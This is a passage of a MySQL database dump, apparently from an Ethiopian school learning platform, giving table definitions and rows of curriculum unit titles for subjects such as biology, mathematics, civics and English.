  `name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `types_name_unique` (`name`)
) ENGINE=InnoDB AUTO_INCREMENT=20 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `types`
--

LOCK TABLES `types` WRITE;
/*!40000 ALTER TABLE `types` DISABLE KEYS */;
/*!40000 ALTER TABLE `types` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `units`
--

DROP TABLE IF EXISTS `units`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `units` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `name` int unsigned NOT NULL,
  `title` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `course_id` int unsigned DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=658 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `units`
--

LOCK TABLES `units` WRITE;
/*!40000 ALTER TABLE `units` DISABLE KEYS */;
INSERT INTO `units` VALUES (7,4,'Cell Biology',1,'2020-10-21 10:43:04','2020-10-21 10:43:04'),(9,7,'The Set of Complex Numbers',14,'2020-10-21 10:47:58','2020-10-21 10:47:58'),(10,4,'Chemical Kinetics',2,'2020-10-21 10:50:05','2020-10-21 10:50:05'),(14,1,'Addis Ababa',28,'2020-12-24 13:13:33','2020-12-24 13:13:33'),(15,1,'Unit 1',32,'2021-02-27 06:14:21','2021-02-27 06:14:21'),(18,2,'Unit 2',32,'2021-02-27 06:15:06','2021-02-27 06:15:06'),(19,3,'Unit 3',32,'2021-02-27 06:15:19','2021-02-27 06:15:19'),(20,4,'Unit 4',32,'2021-02-27 06:15:25','2021-02-27 06:15:25'),(21,5,'Unit 5',32,'2021-02-27 06:15:31','2021-02-27 06:15:31'),(22,6,'Unit 6',32,'2021-02-27 06:15:59','2021-02-27 06:15:59'),(23,7,'Unit 7',32,'2021-02-27 06:16:06','2021-02-27 06:16:06'),(24,8,'Unit 8',32,'2021-02-27 06:16:13','2021-02-27 06:16:13'),(25,9,'Unit 9',32,'2021-02-27 06:16:18','2021-02-27 06:16:18'),(26,10,'Unit 10',32,'2021-02-27 06:16:23','2021-02-27 06:16:23'),(27,1,'Sequences and Series',21,'2021-03-09 06:10:03','2021-03-09 06:10:03'),(28,2,'Introduction to Limits and Continuity',21,'2021-03-09 06:10:09','2021-03-09 06:10:09'),(29,3,'Introduction to Differential Calculus',21,'2021-03-09 06:10:14','2021-03-09 06:10:14'),(30,4,'Applications of Differential Calculus',21,'2021-03-09 06:10:17','2021-03-09 06:10:17'),(31,5,'Introduction to Integral Calculus',21,'2021-03-09 06:10:21','2021-03-09 06:10:21'),(32,6,'Three Dimensional Geometry and Vectors in space',21,'2021-03-09 06:10:25','2021-03-09 06:10:25'),(33,7,'Mathematical Proofs ',21,'2021-03-09 06:10:28','2021-03-09 06:10:28'),(34,8,'Further on Statistics',21,'2021-03-09 06:10:33','2021-03-09 06:10:33'),(35,9,'Mathematical Applications for Business and consumers',21,'2021-03-09 06:10:37','2021-03-09 06:10:37'),(36,1,'unit1',36,'2021-03-09 07:20:25','2021-03-09 07:20:25'),(37,2,'unit2',36,'2021-03-09 07:20:40','2021-03-09 07:20:40'),(38,3,'unit3',36,'2021-03-09 07:20:45','2021-03-09 07:20:45'),(39,4,'unit4',36,'2021-03-09 07:20:53','2021-03-09 07:20:53'),(40,5,'Unit5',36,'2021-03-09 07:20:58','2021-03-09 07:20:58'),(41,6,'unit6',36,'2021-03-09 07:21:03','2021-03-09 07:21:03'),(42,7,'unit7',36,'2021-03-09 07:21:08','2021-03-09 07:21:08'),(43,1,'Unit1',37,'2021-03-09 07:25:06','2021-03-09 07:25:06'),(44,2,'Unit2',37,'2021-03-09 07:25:11','2021-03-09 07:25:11'),(45,3,'Unit3',37,'2021-03-09 07:25:16','2021-03-09 07:25:16'),(46,4,'Unit4',37,'2021-03-09 07:25:21','2021-03-09 07:25:21'),(47,5,'Unit5',37,'2021-03-09 07:25:28','2021-03-09 07:25:28'),(48,6,'Unit6',37,'2021-03-09 07:25:33','2021-03-09 07:25:33'),(49,7,'Unit7',37,'2021-03-09 07:25:38','2021-03-09 07:25:38'),(50,1,'The science of Biology',1,'2021-03-09 10:59:58','2021-03-09 10:59:58'),(51,2,'Biochemical Molecules',1,'2021-03-09 11:01:39','2021-03-09 11:01:39'),(52,3,'Enzymes',1,'2021-03-09 11:01:46','2021-03-09 11:01:46'),(54,5,'Energy Transformation',1,'2021-03-09 11:11:20','2021-03-09 11:11:20'),(55,1,'Unit11',44,'2021-03-11 11:23:37','2021-03-11 11:23:37'),(66,1,'Structure of the Atom',34,'2021-03-11 15:52:15','2021-03-11 15:52:15'),(67,2,'Periodic Classification of the Elements',34,'2021-03-11 15:52:50','2021-03-11 15:52:50'),(68,1,'Main Sectors of Ethiopian Economy',31,'2021-03-12 07:44:23','2021-03-12 07:44:23'),(69,2,'The Agricultural Sector In Ethiopian Economy',31,'2021-03-12 07:44:34','2021-03-12 07:44:34'),(70,3,'The Industrial Sector In Ethiopia',31,'2021-03-12 07:45:08','2021-03-12 07:45:08'),(71,4,'The Service Sector In Ethiopia',31,'2021-03-12 07:45:23','2021-03-12 07:45:23'),(72,5,'Trade In The Ethiopian Economy',31,'2021-03-12 07:45:33','2021-03-12 07:45:33'),(73,6,'Fiscal Policy And Public Development In Ethiopia',31,'2021-03-12 07:45:43','2021-03-12 07:45:43'),(74,7,'Monetary Policy and Financial Sector in Ethiopia',31,'2021-03-12 07:45:56','2021-03-12 07:45:56'),(75,8,'The Economic Reform Program In Ethiopia',31,'2021-03-12 07:46:05','2021-03-12 07:46:05'),(76,1,'Building a Democratic System',49,'2021-03-12 10:21:20','2021-03-12 10:21:20'),(77,2,'Rule of Law',49,'2021-03-12 10:21:35','2021-03-12 10:21:35'),(78,3,'Equality',49,'2021-03-12 10:21:44','2021-03-12 10:21:44'),(79,4,'Justice',49,'2021-03-12 10:21:52','2021-03-12 10:21:52'),(80,5,'Patriotism',49,'2021-03-12 10:22:03','2021-03-12 10:22:03'),(81,1,'Marketing',60,'2021-03-12 10:56:01','2021-03-12 10:56:01'),(82,2,'Communication',60,'2021-03-12 10:56:14','2021-03-12 10:56:14'),(83,3,'Trade',60,'2021-03-12 10:56:24','2021-03-12 10:56:24'),(84,4,'Business records keeping and financial reports',60,'2021-03-12 10:57:21','2021-03-12 10:57:21'),(85,1,'BASIC RESEARCH METHODOLOGIES IN GEOGRAPHY',52,'2021-03-12 15:48:28','2021-03-12 15:48:28'),(86,2,'MAP USE AND MAP WORK',52,'2021-03-12 15:48:45','2021-03-12 15:48:45'),(87,3,'PHYSICAL GEOGRAPHY OF ETHIOPIA AND THE HORN',52,'2021-03-12 15:49:07','2021-03-12 15:49:07'),(88,4,'POPULATION OF ETHIOPIA AND THE HORN',52,'2021-03-12 15:49:19','2021-03-12 15:49:19'),(89,5,'ECONOMIC GROWTH AND DEVELOPMENT TREND IN ETHIOPIA',52,'2021-03-12 15:49:30','2021-03-12 15:49:30'),(90,1,'The African Union',58,'2021-03-13 12:05:43','2021-03-13 12:05:43'),(91,2,'Education',58,'2021-03-13 12:06:00','2021-03-13 12:06:00'),(92,3,'Traditional and modern medicine',58,'2021-03-13 12:08:24','2021-03-13 12:08:24'),(93,1,'Further on Relation and Functions',14,'2021-03-13 15:13:25','2021-03-13 15:13:25'),(94,2,'Rational Expressions and Rational Functions',14,'2021-03-13 15:13:44','2021-03-13 15:13:44'),(95,3,'Coordinate Geometry',14,'2021-03-13 15:14:18','2021-03-13 15:14:18'),(96,4,'Mathematical Reasoning',14,'2021-03-13 15:14:29','2021-03-13 15:14:29'),(97,5,'Statistics and Probability',14,'2021-03-13 15:14:42','2021-03-13 15:14:42'),(98,6,'Matrices and Determinants',14,'2021-03-13 15:16:18','2021-03-13 15:16:18'),(99,8,'Vectors and Transformation of the Plane',14,'2021-03-13 15:16:31','2021-03-13 15:16:31'),(100,9,'Further on Trigonometric Functions',14,'2021-03-13 15:16:43','2021-03-13 15:16:43'),(101,10,'Introduction to Linear Programming',14,'2021-03-13 15:16:56','2021-03-13 15:16:56'),(102,11,'Mathematical Applications in Business',14,'2021-03-13 15:17:06','2021-03-13 15:17:06'),(103,1,'Measurement and practical work',56,'2021-03-13 15:30:31','2021-03-13 15:30:31'),(104,2,'Vector quantities',56,'2021-03-13 15:30:46','2021-03-13 15:30:46'),(105,3,'Kinematics',56,'2021-03-13 15:30:57','2021-03-13 15:30:57'),(106,4,'Dynamics',56,'2021-03-13 15:31:19','2021-03-13 15:31:19'),(107,5,'Work, energy and power',56,'2021-03-13 15:31:33','2021-03-13 15:31:33'),(108,6,'Rotational motion',56,'2021-03-13 15:31:47','2021-03-13 15:31:47'),(109,7,'Equilibrium',56,'2021-03-13 15:32:01','2021-03-13 15:32:01'),(110,8,'Properties of bulk matter',56,'2021-03-13 15:32:20','2021-03-13 15:32:20'),(111,10,'Capitalism and the Growth of Democracy',62,'2021-03-29 15:55:54','2021-03-29 15:55:54'),(112,1,'Solutions',22,'2021-03-30 16:45:35','2021-03-30 16:45:35'),(113,3,'Chemical Bonding and Structure',2,'2021-03-31 06:18:56','2021-03-31 06:18:56'),(114,1,'Biology and technology',35,'2021-04-08 15:57:26','2021-04-08 15:57:26'),(115,2,'Cell biology',35,'2021-04-08 15:57:41','2021-04-08 15:57:41'),(116,3,'Human biology and health',35,'2021-04-08 15:57:58','2021-04-08 15:57:58'),(117,4,'Micro-organisms and disease',35,'2021-04-08 15:58:10','2021-04-08 15:58:10'),(118,5,'Classification',35,'2021-04-08 15:58:23','2021-04-08 15:58:23'),(119,6,'Environment',35,'2021-04-08 15:58:34','2021-04-08 15:58:34'),(120,3,'Chemical Bonding and Intermolecular Forces',34,'2021-04-09 08:08:02','2021-04-09 08:08:02'),(121,4,'Chemical Reaction and Stoichiometry',34,'2021-04-09 08:08:35','2021-04-09 08:08:35'),(122,5,'Physical States of Matter',34,'2021-04-09 08:08:55','2021-04-09 08:08:55'),(123,1,'Building a Democratic System',48,'2021-04-09 09:11:28','2021-04-09 09:11:28'),(124,2,'Rule of Law',48,'2021-04-09 09:11:37','2021-04-09 09:11:37'),(125,3,'Equality',48,'2021-04-09 09:11:50','2021-04-09 09:11:50'),(126,4,'Justice',48,'2021-04-09 09:11:59','2021-04-09 09:11:59'),(127,5,'Patriotism',48,'2021-04-09 09:12:11','2021-04-09 09:12:11'),(128,6,'Responsibility',48,'2021-04-09 09:12:20','2021-04-09 09:12:20'),(129,7,'Industriousness',48,'2021-04-09 09:12:28','2021-04-09 09:12:28'),(130,8,'Self-Reliance',48,'2021-04-09 09:12:37','2021-04-09 09:12:37'),(131,9,'Saving',48,'2021-04-09 09:12:47','2021-04-09 09:12:47'),(132,10,'Active Community Participation',48,'2021-04-09 09:12:58','2021-04-09 09:12:58'),(133,11,'The Pursuit of Wisdom',48,'2021-04-09 09:13:10','2021-04-09 09:13:10'),(134,1,'Learning to learn',33,'2021-04-09 10:15:36','2021-04-09 10:15:36'),(135,2,'Places to visit',33,'2021-04-09 10:15:46','2021-04-09 10:15:46'),(136,3,'Hobbies and crafts',33,'2021-04-09 10:16:38','2021-04-09 10:16:38'),(137,4,'Food for health',33,'2021-04-09 10:16:57','2021-04-09 10:16:57'),(138,5,'HIV and AIDS',33,'2021-04-09 10:17:13','2021-04-09 10:17:13'),(139,6,'Media, TV and Radio',33,'2021-04-09 10:17:30','2021-04-09 10:17:30'),(140,7,'Cities of the future',33,'2021-04-09 10:17:43','2021-04-09 10:17:43'),(141,8,'Money and finance',33,'2021-04-09 10:18:01','2021-04-09 10:18:01'),(142,9,'People and traditional culture',33,'2021-04-09 10:18:31','2021-04-09 10:18:31'),(143,10,'Newspapers and magazines',33,'2021-04-09 10:18:54','2021-04-09 10:18:54'),(144,11,'Endangered animals',33,'2021-04-09 10:19:18','2021-04-09 10:19:18'),(145,12,'Stigma and discrimination',33,'2021-04-09 10:19:35','2021-04-09 10:19:35'),(146,1,'The Concept of Geography and Map-Reading',50,'2021-04-19 14:49:33','2021-04-19 14:49:33'),(147,2,'Physical Environment of world and Ethiopia',50,'2021-04-19 14:50:00','2021-04-19 14:50:00'),(148,3,'Human population and economic activities',50,'2021-04-19 14:50:32','2021-04-19 14:50:32'),(149,4,'Public and Policy related issues in Ethiopia',50,'2021-04-19 14:50:52','2021-04-19 14:50:52'),(150,1,'Democratic System',63,'2021-04-23 16:08:12','2021-04-23 16:08:12'),(151,2,'The Rule of Law',63,'2021-04-23 16:08:25','2021-04-23 16:08:25'),(152,3,'Equality',63,'2021-04-23 16:08:37','2021-04-23 16:08:37'),(153,4,'Justice',63,'2021-04-23 16:08:49','2021-04-23 16:08:49'),(154,5,'Patriotism',63,'2021-04-23 16:08:59','2021-04-23 16:08:59'),(155,6,'Responsibility',63,'2021-04-23 16:09:14','2021-04-23 16:09:14'),(156,7,'Industriousness',63,'2021-04-23 16:09:37','2021-04-23 16:09:37'),(157,8,'Self-Reliance',63,'2021-04-23 16:11:54','2021-04-23 16:11:54'),(158,9,'Saving',63,'2021-04-23 16:12:07','2021-04-23 16:12:07'),(159,10,'Active Community Participation',63,'2021-04-23 16:12:33','2021-04-23 16:12:33'),(160,11,'Pursuit of Wisdom',63,'2021-04-23 16:12:52','2021-04-23 16:12:52'),(161,1,'Democratic System',68,'2021-04-23 16:25:45','2021-04-23 16:25:45'),(162,2,'The Rule of Law',68,'2021-04-23 16:25:58','2021-04-23 16:25:58'),(163,3,'Equality',68,'2021-04-23 16:26:10','2021-04-23 16:26:10'),(164,4,'Justice',68,'2021-04-23 16:26:25','2021-04-23 16:26:25'),(165,5,'Patriotism',68,'2021-04-23 16:26:52','2021-04-23 16:26:52'),(166,6,'Responsibility',68,'2021-04-23 16:27:06','2021-04-23 16:27:06'),(167,7,'Industriousness',68,'2021-04-23 16:27:23','2021-04-23 16:27:23'),(168,8,'Self-Reliance',68,'2021-04-23 16:27:38','2021-04-23 16:27:38'),(169,9,'Saving',68,'2021-04-23 16:27:49','2021-04-23 16:27:49'),(170,10,'Active Community Participation',68,'2021-04-23 16:28:11','2021-04-23 16:28:11'),(171,11,'Pursuit of Wisdom',68,'2021-04-23 16:28:29','2021-04-23 16:28:29'),(172,1,'A popular sport',69,'2021-04-23 16:47:00','2021-04-23 16:47:00'),(173,1,'Physics and Measurement',70,'2021-04-24 08:44:41','2021-04-24 08:44:41'),(174,2,'Motion',70,'2021-04-24 08:44:53','2021-04-24 08:44:53'),(175,3,'Force and Newton\'s Laws of motion',70,'2021-04-24 08:45:18','2021-04-24 08:45:18'),(176,4,'Work, Energy and Power',70,'2021-04-24 08:45:38','2021-04-24 08:45:38'),(177,5,'Simple Machines',70,'2021-04-24 08:45:56','2021-04-24 08:45:56'),(178,6,'Temperature and Heat',70,'2021-04-24 08:46:10','2021-04-24 08:46:10'),(179,7,'Sound',70,'2021-04-24 08:46:22','2021-04-24 08:46:22'),(180,8,'Electricity and Magnetism',70,'2021-04-24 08:46:47','2021-04-24 08:46:47'),(181,1,'What I do in my free time',64,'2021-04-24 10:59:46','2021-04-24 10:59:46'),(182,2,'What are you doing now?',64,'2021-04-24 11:01:54','2021-04-24 11:01:54'),(183,3,'May I help you?',64,'2021-04-24 11:02:09','2021-04-24 11:02:09'),(184,4,'Would you like to come to my birthday party?',64,'2021-04-24 11:02:39','2021-04-24 11:02:39'),(185,5,'People and the past',64,'2021-04-24 11:02:57','2021-04-24 11:02:57'),(186,6,'The Jungle',64,'2021-04-24 11:04:23','2021-04-24 11:04:23'),(187,7,'Let\'s make our school beautiful',64,'2021-04-24 11:04:49','2021-04-24 11:04:49'),(188,8,'Have a cup of tea!',64,'2021-04-24 11:07:05','2021-04-24 11:07:05'),(189,9,'Watch out!',64,'2021-04-24 11:07:18','2021-04-24 11:07:18'),(190,10,'Who is your nephew?',64,'2021-04-24 11:07:38','2021-04-24 11:07:38'),(191,11,'Let\'s keep healthy',64,'2021-04-24 11:07:58','2021-04-24 11:07:58'),(192,12,'Animal Story',64,'2021-04-24 11:08:11','2021-04-24 11:08:11'),(193,1,'Whole numbers and the four operations',65,'2021-04-24 11:30:56','2021-04-24 11:30:56'),(194,2,'Working with Variables',65,'2021-04-24 11:31:10','2021-04-24 11:31:10'),(195,3,'Fractions, Decimals and the four operations',65,'2021-04-24 11:31:36','2021-04-24 11:31:36'),(196,4,'Data Handling',65,'2021-04-24 11:31:52','2021-04-24 11:31:52'),(197,5,'Geometric figures and measurement',65,'2021-04-24 11:32:24','2021-04-24 11:32:24'),(198,1,'The people, location and settlement of Ethiopia and the horn of Africa',67,'2021-04-24 11:45:15','2021-04-24 11:45:15'),(199,2,'The earth and its surroundings',67,'2021-04-24 11:45:39','2021-04-24 11:45:39'),(200,3,'Our Environment',67,'2021-04-24 11:46:02','2021-04-24 11:46:02'),(201,4,'Public Agenda',67,'2021-04-24 11:46:22','2021-04-24 11:46:22'),(202,1,'What are you wearing?',71,'2021-04-24 11:55:12','2021-04-24 11:55:12'),(203,2,'Ras Dashen',71,'2021-04-24 11:55:28','2021-04-24 11:55:28'),(204,3,'Who am I?',71,'2021-04-24 11:55:39','2021-04-24 11:55:39'),(205,4,'My favorite dish',71,'2021-04-24 11:56:26','2021-04-24 11:56:26'),(206,5,'Animal fables',71,'2021-04-24 11:56:41','2021-04-24 11:56:41'),(207,6,'How we used to live',71,'2021-04-24 11:57:05','2021-04-24 11:57:05'),(208,7,'Having a large family or...',71,'2021-04-24 11:57:28','2021-04-24 11:57:28'),(209,8,'Where is your home town/village?',71,'2021-04-24 11:57:46','2021-04-24 11:57:46'),(210,9,'I think I will',71,'2021-04-24 11:58:03','2021-04-24 11:58:03'),(211,10,'Save our world',71,'2021-04-24 11:58:17','2021-04-24 11:58:17'),(212,11,'Healthy living',71,'2021-04-24 11:58:41','2021-04-24 11:58:41'),(213,12,'I can do it',71,'2021-04-24 11:58:55','2021-04-24 11:58:55'),(214,12,'Say no to child labor',71,'2021-04-24 11:59:19','2021-04-24 11:59:19'),(215,1,'Basic concepts of Set',72,'2021-04-24 12:11:43','2021-04-24 12:11:43'),(216,2,'The Divisibility of whole numbers',72,'2021-04-24 12:12:17','2021-04-24 12:12:17'),(217,3,'Fractions and Decimals',72,'2021-04-24 12:12:48','2021-04-24 12:12:48'),(218,4,'Integers',72,'2021-04-24 12:13:46','2021-04-24 12:13:46'),(219,5,'Linear equations, Linear inequalities and Proportionality',72,'2021-04-24 12:14:41','2021-04-24 12:14:41'),(220,6,'Geometry and Measurement',72,'2021-04-24 12:15:08','2021-04-24 12:15:08'),(221,1,'The Location, Settlement and people of eastern Africa',73,'2021-04-24 12:21:47','2021-04-24 12:21:47'),(222,2,'The Earth, our home',73,'2021-04-24 12:22:05','2021-04-24 12:22:05'),(223,3,'Our Environment',73,'2021-04-24 12:22:16','2021-04-24 12:22:16'),(224,4,'Public Agenda',73,'2021-04-24 12:22:28','2021-04-24 12:22:28'),(225,1,'Democratic System',74,'2021-04-24 12:31:29','2021-04-24 12:31:29'),(226,2,'The Rule of Law',74,'2021-04-24 12:31:45','2021-04-24 12:31:45'),(227,3,'Equality',74,'2021-04-24 12:31:59','2021-04-24 12:31:59'),(228,4,'Justice',74,'2021-04-24 12:32:10','2021-04-24 12:32:10'),(229,5,'Patriotism',74,'2021-04-24 12:32:23','2021-04-24 12:32:23'),(230,6,'Responsibility',74,'2021-04-24 12:32:37','2021-04-24 12:32:37'),(231,7,'Industriousness',74,'2021-04-24 12:32:48','2021-04-24 12:32:48'),(232,8,'Self-Reliance',74,'2021-04-24 12:33:01','2021-04-24 12:33:01'),(233,9,'Saving',74,'2021-04-24 12:33:13','2021-04-24 12:33:13'),(235,10,'Active Community Participation',74,'2021-04-24 12:36:09','2021-04-24 12:36:09'),(236,11,'The Pursuit of Wisdom',74,'2021-04-24 12:36:25','2021-04-24 12:36:25'),(237,1,'Rational Numbers',75,'2021-04-24 12:47:10','2021-04-24 12:47:10'),(238,2,'Linear equations and Inequalities',75,'2021-04-24 12:47:52','2021-04-24 12:47:52'),(239,3,'Ratio, Proportion and Percentage',75,'2021-04-24 12:48:23','2021-04-24 12:48:23'),(241,4,'Data Handling',75,'2021-04-24 13:14:02','2021-04-24 13:14:02'),(242,5,'Geometric figures and',75,'2021-04-24 13:23:14','2021-04-24 13:23:14'),(243,1,'Living in Africa',76,'2021-04-24 13:28:22','2021-04-24 13:28:22'),(244,2,'Structure of the Earth',76,'2021-04-24 13:28:48','2021-04-24 13:28:48'),(245,3,'The Eco-System and its challenges',76,'2021-04-24 13:29:11','2021-04-24 13:29:11'),(246,4,'Public Agenda',76,'2021-04-24 13:29:26','2021-04-24 13:29:26'),(247,1,'My Village/town',77,'2021-04-24 13:37:13','2021-04-24 13:37:13'),(248,2,'Ethiopian languages',77,'2021-04-24 13:37:29','2021-04-24 13:37:29'),(249,3,'Holidays and Festivals',77,'2021-04-24 13:37:48','2021-04-24 13:37:48'),(250,4,'I am going to visit Lalibela',77,'2021-04-24 13:38:04','2021-04-24 13:38:04'),(251,5,'Adwa',77,'2021-04-24 13:38:13','2021-04-24 13:38:13'),(252,6,'How is a Gabi made?',77,'2021-04-24 13:38:33','2021-04-24 13:38:33'),(253,7,'Have you ever?',77,'2021-04-24 13:38:50','2021-04-24 13:38:50'),(254,8,'How does it work?',77,'2021-04-24 13:39:03','2021-04-24 13:39:03'),(255,9,'Traditional games',77,'2021-04-24 13:41:48','2021-04-24 13:41:48'),(256,10,'Taking care of animals',77,'2021-04-24 13:42:02','2021-04-24 13:42:02'),(257,11,'Say no to early marriages',77,'2021-04-24 13:42:17','2021-04-24 13:42:17'),(258,12,'I have already done that',77,'2021-04-24 13:42:37','2021-04-24 13:42:37'),(260,2,'Story/Poem',69,'2021-04-24 13:55:53','2021-04-24 13:55:53'),(261,3,'The city and the country',69,'2021-04-24 13:56:11','2021-04-24 13:56:11'),(262,4,'Education for all',69,'2021-04-24 13:56:31','2021-04-24 13:56:31'),(263,5,'A scientist discovers',69,'2021-04-24 13:56:50','2021-04-24 13:56:50'),(264,6,'Personal future plans',69,'2021-04-24 13:57:07','2021-04-24 13:57:07'),(265,7,'A day in the life of ...',69,'2021-04-24 14:01:52','2021-04-24 14:01:52'),(266,8,'Making Ethiopian coffee',69,'2021-04-24 14:02:13','2021-04-24 14:02:13'),(267,9,'Plants for medicinal use',69,'2021-04-24 14:02:38','2021-04-24 14:02:38'),(268,10,'Art and Artists',69,'2021-04-24 14:03:00','2021-04-24 14:03:00'),(269,11,'Natural wonders of Africa',69,'2021-04-24 14:03:17','2021-04-24 14:03:17'),(270,12,'Technology in the modern world',69,'2021-04-24 14:03:44','2021-04-24 14:03:44'),(271,13,'A historical person',69,'2021-04-24 14:04:00','2021-04-24 14:04:00'),(272,14,'African Folktale',69,'2021-04-24 14:04:26','2021-04-24 14:04:26'),(273,1,'Democratic System',78,'2021-04-24 14:31:28','2021-04-24 14:31:28'),(274,2,'The Rule of Law',78,'2021-04-24 14:31:41','2021-04-24 14:31:41'),(275,3,'Equality',78,'2021-04-24 14:31:50','2021-04-24 14:31:50'),(276,4,'Justice',78,'2021-04-24 14:32:03','2021-04-24 14:32:03'),(277,5,'Patriotism',78,'2021-04-24 14:32:14','2021-04-24 14:32:14'),(278,6,'Responsibility',78,'2021-04-24 14:32:28','2021-04-24 14:32:28'),(279,7,'Industriousness',78,'2021-04-24 14:32:48','2021-04-24 14:32:48'),(280,8,'Self-Reliance',78,'2021-04-24 14:33:00','2021-04-24 14:33:00'),(281,9,'Saving',78,'2021-04-24 14:33:26','2021-04-24 14:33:26'),(282,10,'Active Community Participation',78,'2021-04-24 14:33:47','2021-04-24 14:33:47'),(283,11,'Pursuit of wisdom',78,'2021-04-24 14:35:34','2021-04-24 14:35:34'),(284,1,'Squares, Square Roots, Cube and Cube Roots',79,'2021-04-26 06:46:26','2021-04-26 06:46:26'),(285,2,'Further on working with variables',79,'2021-04-26 06:46:53','2021-04-26 06:46:53'),(286,3,'Linear Equation and Inequalities',79,'2021-04-26 06:47:27','2021-04-26 06:47:27'),(287,4,'Similar Figures',79,'2021-04-26 06:47:44','2021-04-26 06:47:44'),(288,5,'Circles',79,'2021-04-26 06:49:14','2021-04-26 06:49:14'),(289,6,'Introduction to Probability',79,'2021-04-26 06:49:38','2021-04-26 06:49:38'),(290,7,'Geometry and Measurements',79,'2021-04-26 06:49:57','2021-04-26 06:49:57'),(291,1,'Physics and Measurement',80,'2021-04-26 07:01:27','2021-04-26 07:01:27'),(292,2,'MOTION IN ONE DIMENSION',80,'2021-04-26 07:01:35','2021-04-26 07:01:35'),(293,3,'PRESSURE ',80,'2021-04-26 07:02:14','2021-04-26 07:02:14'),(294,4,'Work, Energy and Power',80,'2021-04-26 07:02:34','2021-04-26 07:02:34'),(295,5,'Simple Machines',80,'2021-04-26 07:02:45','2021-04-26 07:02:45'),(296,6,'Temperature and Heat',80,'2021-04-26 07:03:07','2021-04-26 07:03:07'),(297,7,'Sound',80,'2021-04-26 07:03:23','2021-04-26 07:03:23'),(298,8,'Electricity and Magnetism',80,'2021-04-26 07:03:41','2021-04-26 07:03:41'),(299,1,'The world we live in',81,'2021-04-26 07:34:05','2021-04-26 07:34:05'),(300,2,'The forces that change the surface of the earth',81,'2021-04-26 07:34:42','2021-04-26 07:34:42'),(301,3,'Human Intervention in the Eco-System',81,'2021-04-26 07:35:17','2021-04-26 07:35:17'),(302,4,'Public Agenda',81,'2021-04-26 07:35:29','2021-04-26 07:35:29'),(303,1,'Greetings',82,'2021-04-26 08:02:37','2021-04-26 08:02:37'),(304,2,'Parts of the Body',82,'2021-04-26 08:02:47','2021-04-26 08:02:47'),(305,3,'What is it called in English?',82,'2021-04-26 08:03:50','2021-04-26 08:03:50'),(306,4,'Colors',82,'2021-04-26 08:04:02','2021-04-26 08:04:02'),(307,5,'Counting',82,'2021-04-26 08:04:10','2021-04-26 08:04:10'),(308,6,'Objects That we Have',82,'2021-04-26 08:04:29','2021-04-26 08:04:29'),(309,7,'My Family',82,'2021-04-26 08:04:40','2021-04-26 08:04:40'),(310,8,'Describing People',82,'2021-04-26 08:04:59','2021-04-26 08:04:59'),(311,9,'Describing Animals',82,'2021-04-26 08:05:13','2021-04-26 08:05:13'),(312,10,'Describing Objects',82,'2021-04-26 08:05:30','2021-04-26 08:05:30'),(313,11,'Finding People, Animals, Objects',82,'2021-04-26 08:05:49','2021-04-26 08:05:49'),(314,12,'Commands',82,'2021-04-26 08:06:11','2021-04-26 08:06:11'),(315,13,'Abilities',82,'2021-04-26 08:06:21','2021-04-26 08:06:21'),(316,14,'Likes and Dislikes',82,'2021-04-26 08:06:38','2021-04-26 08:06:38'),(317,15,'Learning at School',82,'2021-04-26 08:06:54','2021-04-26 08:06:54'),(318,1,'In the Classroom',83,'2021-04-26 08:20:15','2021-04-26 08:20:15'),(319,2,'How many Books?',83,'2021-04-26 08:20:33','2021-04-26 08:20:33'),(320,3,'What Color is your Bag?',83,'2021-04-26 08:35:59','2021-04-26 08:35:59'),(321,4,'Parts of the Body',83,'2021-04-26 08:36:12','2021-04-26 08:36:12'),(322,5,'I have a new Pen',83,'2021-04-26 08:37:00','2021-04-26 08:37:00'),(323,6,'Days of the week',83,'2021-04-26 08:37:18','2021-04-26 08:37:18'),(324,7,'Time to Eat and Drink',83,'2021-04-26 08:37:37','2021-04-26 08:37:37'),(325,8,'What an Amazing Animal',83,'2021-04-26 08:37:56','2021-04-26 08:37:56'),(326,9,'my Likes and Dislikes',83,'2021-04-26 08:38:17','2021-04-26 08:38:17'),(327,10,'Who Lives in this House?',83,'2021-04-26 08:38:31','2021-04-26 08:38:31'),(328,11,'A Frog can jump',83,'2021-04-26 08:38:51','2021-04-26 08:38:51'),(329,12,'What are you Wearing?',83,'2021-04-26 08:39:08','2021-04-26 08:39:08'),(330,13,'I Walk to School',83,'2021-04-26 08:39:21','2021-04-26 08:39:21'),(331,14,'Look at all the People',83,'2021-04-26 08:39:40','2021-04-26 08:39:40'),(332,1,'At School',84,'2021-04-26 08:54:13','2021-04-26 08:54:13'),(333,2,'Ten Oranges Please!',84,'2021-04-26 08:54:28','2021-04-26 08:54:28'),(334,3,'You must have fun',84,'2021-04-26 08:54:47','2021-04-26 08:54:47'),(335,4,'Let\'s wash our hands',84,'2021-04-26 08:55:00','2021-04-26 08:55:00'),(336,5,'My father looks after the children',84,'2021-04-26 08:55:32','2021-04-26 08:55:32'),(337,6,'What are the children doing?',84,'2021-04-26 08:55:54','2021-04-26 08:55:54'),(338,7,'Thirteen months of sunshine',84,'2021-04-26 08:56:22','2021-04-26 08:56:22'),(339,8,'My mother has long hair',84,'2021-04-26 08:56:38','2021-04-26 08:56:38'),(340,9,'On the farm',84,'2021-04-26 08:56:48','2021-04-26 08:56:48'),(341,10,'What do you do every day?',84,'2021-04-26 08:57:11','2021-04-26 08:57:11'),(342,11,'Do you like playing football?',84,'2021-04-26 08:57:31','2021-04-26 08:57:31'),(343,12,'A nurse works in a Clinic',84,'2021-04-26 08:57:59','2021-04-26 08:57:59'),(344,1,'My School',85,'2021-04-26 09:06:14','2021-04-26 09:06:14'),(345,2,'How 